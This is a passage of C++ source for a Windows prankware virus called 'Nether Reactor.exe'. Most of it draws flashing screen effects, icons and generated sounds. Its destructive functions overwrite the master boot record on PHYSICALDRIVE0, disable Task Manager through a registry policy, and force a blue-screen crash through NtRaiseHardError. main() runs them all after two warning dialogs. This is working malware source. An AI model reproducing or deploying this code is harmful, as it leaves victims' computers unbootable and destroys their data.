		DrawIconEx(hdc, p.x, p.y, LoadIconW(NETHERREACTORICON, MAKEINTRESOURCE(rand() % 256)), 64, 64, NULL, NULL, DI_NORMAL);
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 25;
			p.y -= 5;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 25;
			p.y -= 5;
			if (p.x >= w - 25 || p.y < 0) {
				if (p.x >= w - 25) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 25;
			p.y += 5;
			if (p.x < 0 || p.y >= h - 5) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 5) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 25 && p.y >= h - 5) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 25;
			p.y += 5;
			if (p.x >= w - 25 || p.y >= h - 5) {
				if (p.x >= w - 25) {
					status = 2;
				}
				if (p.y >= h - 5) {
					status = 1;
				}
			}
			break;
		}
		Sleep(10);
	}
}

DWORD WINAPI mypayload72k(LPVOID lpParam) {
	HINSTANCE NETHERREACTORICON2K = LoadLibrary(_T("NETHERREACTORICON2K.dll"));
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		DrawIconEx(hdc, p.x, p.y, LoadIconW(NETHERREACTORICON2K, MAKEINTRESOURCE(rand() % 256)), 64, 64, NULL, NULL, DI_NORMAL);
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 25;
			p.y -= 5;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 25;
			p.y -= 5;
			if (p.x >= w - 25 || p.y < 0) {
				if (p.x >= w - 25) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 25;
			p.y += 5;
			if (p.x < 0 || p.y >= h - 5) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 5) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 25 && p.y >= h - 5) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 25;
			p.y += 5;
			if (p.x >= w - 25 || p.y >= h - 5) {
				if (p.x >= w - 25) {
					status = 2;
				}
				if (p.y >= h - 5) {
					status = 1;
				}
			}
			break;
		}
		Sleep(10);
	}
}

DWORD WINAPI mypayload8(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	LPCWSTR lpText = L"Nether Reactor.exe";
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, p.x, p.y, lpText, wcslen(lpText));
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 10;
			p.y -= 10;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 10;
			p.y -= 10;
			if (p.x >= w - 10 || p.y < 0) {
				if (p.x >= w - 10) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 10;
			p.y += 10;
			if (p.x < 0 || p.y >= h - 10) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 10) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 10 && p.y >= h - 10) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 10;
			p.y += 10;
			if (p.x >= w - 10 || p.y >= h - 10) {
				if (p.x >= w - 10) {
					status = 2;
				}
				if (p.y >= h - 10) {
					status = 1;
				}
			}
			break;
		}
		Sleep(10);
	}
}

DWORD WINAPI payload1(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	int cx, cy, sgn;
	sgn = 0;
	int dwStartTime = time(NULL);
	HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
	for (;;) {
		HDC hdc = GetDC(NULL);
		for (cy = 0; cy < h; ) {
			for (cx = 0; cx < w; ) {
				DrawIcon(hdc, cx, cy, LoadIcon(HSHELL32, MAKEINTRESOURCE(rand() % 256)));
				cx += 20;
				Sleep(1);
			}
			cy += 20;
			if (sgn >= 6) {
				sgn = 0;
			}
			else {
				sgn++;
			}
		}
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
}

DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	for (;;) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(fe(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI squares(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	for (;;) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(fe(239));
		SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload3(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		int icnsz = GetSystemMetrics(SM_CXICON);
		POINT p;
		int x = rand() % 2;
		if (x) {
			p.x = 0;
			p.y = rand() % h;
		}
		else {
			p.x = rand() % w;
			p.y = 0;
		}
		for (;;) {
			if (p.x >= w - icnsz || p.y >= h - icnsz) {
				break;
			}
			DrawIcon(hdc, p.x, p.y, LoadIcon(HSHELL32, MAKEINTRESOURCE(rand() % 256)));
			p.x += icnsz;
			p.y += icnsz;
			Sleep(10);
		}
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
}

DWORD WINAPI lines(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw, sh;
	sw = GetSystemMetrics(SM_CXSCREEN);
	sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		LineTo(hdc, rand() % (0 - sw), 0);
		LineTo(hdc, rand() % (0 - sw), sh);
	}
}

DWORD WINAPI colorlines(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw, sh;
	sw = GetSystemMetrics(SM_CXSCREEN);
	sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;)
	{
		HDC hdc = GetDC(0);
		HPEN hPen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hPen);
		LineTo(hdc, rand() % (0 - sw), 0);
		LineTo(hdc, rand() % (0 - sw), sh);
		Sleep(10);
	}
}

DWORD WINAPI whitelines(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw, sh;
	sw = GetSystemMetrics(SM_CXSCREEN);
	sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;)
	{
		HDC hdc = GetDC(0);
		HPEN hPen = CreatePen(PS_SOLID, 5, RGB(255, 255, 255));
		SelectObject(hdc, hPen);
		LineTo(hdc, rand() % (0 - sw), 0);
		LineTo(hdc, rand() % (0 - sw), sh);
		Sleep(10);
	}
}

DWORD WINAPI rgbscreen(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw, sh;
	sw = GetSystemMetrics(SM_CXSCREEN);
	sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;)
	{
		SelectObject(desk, CreateSolidBrush(fe(255)));
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, PATINVERT);
	}
	return 0;
}

DWORD WINAPI Color(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	for (;;)
	{
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(100);
	}
	return 0;
}

DWORD WINAPI ColorInvert(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI shader3(LPVOID lpParam) {
	typedef union _RGBQUAD {
		COLORREF rgb;
		struct {
			BYTE r;
			BYTE g;
			BYTE b;
			BYTE Reserved;
		};
	}_RGBQUAD, * PRGBQUAD;
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x | y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	Sleep(50);
}

DWORD WINAPI mypayload4(LPVOID lpParam) {
	typedef union _RGBQUAD {
		COLORREF rgb;
		struct {
			BYTE r;
			BYTE g;
			BYTE b;
			BYTE Reserved;
		};
	}_RGBQUAD, * PRGBQUAD;
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = sw;
	bmi.bmiHeader.biHeight = sh;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < sw * sh; i++) {
			INT x = sw - i, y = i % sw;
			rgbScreen[i].rgb += x + y;
		}
		BitBlt(hdcScreen, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(50);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 2 ^ (t << 1) + (t >> 7) & t >> 12 | t >> 4 - (1 ^ 7 & t >> 19) | t >> 7);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 1 ^ (t << 1) + (t >> 7) & t >> 12 | t >> 4 - (2 ^ 7 & t >> 19) | t >> 7);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 | (t >> 3) * (t >> 3));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * t & t >> 7);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(7 * t & t >> 5 | 3 * t & t >> 10);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t - (t >> 12 & t >> 8) >> (t >> 20 & t >> 12) & t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11) & t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 3 + 2 * t | t << 2 % (t + 1 | t));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char> (((t + 7) ^ t >> 5 | (t - 6) + t >> 8) & t++);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (1 + (1 & t >> 1)) >> (1 & t >> 1) | t >> 16);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void disabletaskmgr()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

int killmbr()
{
	BYTE pmbr[6144] = { 0 };
	DWORD write;
	HANDLE mbr;
	char mbrdata[mbrsize] = boot;
	memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
	pmbr[510] = 0x55;
	pmbr[511] = 0xAA;
	mbr = CreateFile
	(
		L"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
	{
	}
	else
	{
	}
	CloseHandle(mbr);
	return EXIT_SUCCESS;
}

void bsod() {
	typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
	typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	ExitProcess(0);
}

int main() {
	OSVERSIONINFOEXW osvi = { 0 };
	DWORDLONG dwlConditionMask = 0;
	ZeroMemory(&osvi, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(osvi);
	osvi.dwMajorVersion = 5;
	osvi.dwMinorVersion = 0;
	VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_EQUAL);
	VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_EQUAL);
	if (VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask))
	{
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Nether Reactor.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Nether Reactor.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
			{
				ExitProcess(0);
			}
			else
			{
				killmbr();
				disabletaskmgr();
				icon2kdll(1);
				sound1();
				HANDLE thread0 = CreateThread(0, 0, drawnetherreactoricon2k, 0, 0, 0);
				HANDLE thread0c = CreateThread(0, 0, chouchu, 0, 0, 0);
				HANDLE thread0d = CreateThread(0, 0, shader3, 0, 0, 0);
				HANDLE thread1 = CreateThread(0, 0, mypayload1, 0, 0, 0);
				HANDLE thread2 = CreateThread(0, 0, mypayload1b, 0, 0, 0);
				HANDLE thread3 = CreateThread(0, 0, mypayload1c, 0, 0, 0);
				HANDLE thread4 = CreateThread(0, 0, drawshell32icon, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread1, 0);
				TerminateThread(thread2, 0);
				TerminateThread(thread3, 0);
				TerminateThread(thread0d, 0);
				sound2();
				HANDLE thread4c = CreateThread(0, 0, mypayload4, 0, 0, 0);
				HANDLE thread5 = CreateThread(0, 0, mypayload2, 0, 0, 0);
				HANDLE thread6 = CreateThread(0, 0, mypayload2b, 0, 0, 0);
				HANDLE thread7 = CreateThread(0, 0, mypayload2c, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread4, 0);
				TerminateThread(thread5, 0);
				TerminateThread(thread6, 0);
				TerminateThread(thread7, 0);
				TerminateThread(thread4c, 0);
				sound3();
				HANDLE thread8 = CreateThread(0, 0, rgbscreen, 0, 0, 0);
				HANDLE thread9 = CreateThread(0, 0, drawbignetherreactoricon2k, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread8, 0);
				TerminateThread(thread9, 0);
				sound4();
				HANDLE thread10 = CreateThread(0, 0, mypayload5, 0, 0, 0);
				HANDLE thread11 = CreateThread(0, 0, rgb, 0, 0, 0);
				HANDLE thread12 = CreateThread(0, 0, mypayload6, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread10, 0);
				TerminateThread(thread11, 0);
				TerminateThread(thread12, 0);
				sound5();
				HANDLE thread13 = CreateThread(0, 0, lines, 0, 0, 0);
				HANDLE thread14 = CreateThread(0, 0, fanseyuan, 0, 0, 0);
				HANDLE thread15 = CreateThread(0, 0, mypayload72k, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread13, 0);
				TerminateThread(thread14, 0);
				sound6();
				HANDLE thread16 = CreateThread(0, 0, colorfangxing, 0, 0, 0);
				HANDLE thread17 = CreateThread(0, 0, colorlines, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread15, 0);
				TerminateThread(thread16, 0);
				TerminateThread(thread17, 0);
				sound7();
				HANDLE thread18 = CreateThread(0, 0, fansefangxing, 0, 0, 0);
				HANDLE thread19 = CreateThread(0, 0, mypayload8, 0, 0, 0);
				HANDLE thread20 = CreateThread(0, 0, whitelines, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread18, 0);
				TerminateThread(thread19, 0);
				TerminateThread(thread20, 0);
				sound8();
				HANDLE thread21 = CreateThread(0, 0, coloryuan, 0, 0, 0);
				HANDLE thread22 = CreateThread(0, 0, copycur, 0, 0, 0);
				HANDLE thread23 = CreateThread(0, 0, drawcur, 0, 0, 0);
				HANDLE thread24 = CreateThread(0, 0, payload1, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread21, 0);
				TerminateThread(thread22, 0);
				TerminateThread(thread23, 0);
				TerminateThread(thread24, 0);
				sound9();
				HANDLE thread25 = CreateThread(0, 0, Color, 0, 0, 0);
				HANDLE thread27 = CreateThread(0, 0, balls, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread25, 0);
				TerminateThread(thread27, 0);
				sound10();
				HANDLE thread28 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
				HANDLE thread29 = CreateThread(0, 0, squares, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread28, 0);
				TerminateThread(thread29, 0);
				TerminateThread(thread0, 0);
				TerminateThread(thread0c, 0);
				bsod();
				return 0;
			}


		}
	}
	else {
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
